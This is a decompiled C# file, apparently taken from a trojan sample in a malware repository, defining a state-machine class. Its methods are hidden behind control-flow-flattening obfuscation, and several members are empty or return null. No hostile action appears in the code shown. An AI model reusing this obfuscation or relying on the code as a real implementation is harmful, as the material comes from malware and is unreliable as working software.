// Decompiled with JetBrains decompiler
// Type: Automata.State`1
// Assembly: KeyValuePairTypeIn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BC10340-E19B-4E23-8390-67C019FFF1B3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.Win32.Generic-d8c6555cb1a96eccd43acde476d43d9c68a39cb56c508416393bbee50249b6b7.exe

using System.Collections.Generic;

namespace Automata
{
  public class State<T> : IAmState<T>
  {
    private readonly string _name;
    private readonly Action _action;
    private readonly List<Transition<T>> _transitions = new List<Transition<T>>();

    public State(string name)
    {
    }

    public State(string name, Action action)
    {
label_1:
      int num1 = 1976750643;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1380350790)) % 4U)
        {
          case 0:
            this._action = action;
            num1 = (int) num2 * -1772541703 ^ 1935239901;
            continue;
          case 1:
            this._name = name;
            num1 = (int) num2 * 35107504 ^ -2105827778;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string Name => this._name;

    public TransitionAccepter<T> To(State<T> target)
    {
      TransitionAccepter<T> transitionAccepter = new TransitionAccepter<T>(this, target);
label_1:
      int num1 = -346769558;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -797923816)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1608867081 ^ 1430612833;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return transitionAccepter;
    }

    public void AddTransition(Transition<T> t)
    {
label_1:
      int num1 = 32344726;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 293637437)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1630274525 ^ 623138970;
            continue;
          case 2:
            goto label_3;
          case 3:
            this._transitions.Add(t);
            num1 = (int) num2 * -548384448 ^ -764211208;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void Execute()
    {
    }

    public IEnumerable<IAmTransition<T>> Transitions
    {
      get
      {
label_1:
        int num1 = 1380882095;
        IEnumerable<IAmTransition<T>> transitions;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1605519753)) % 3U)
          {
            case 1:
              transitions = (IEnumerable<IAmTransition<T>>) null;
              num1 = (int) num2 * -2120643947 ^ -1203621137;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return transitions;
      }
    }
  }
}
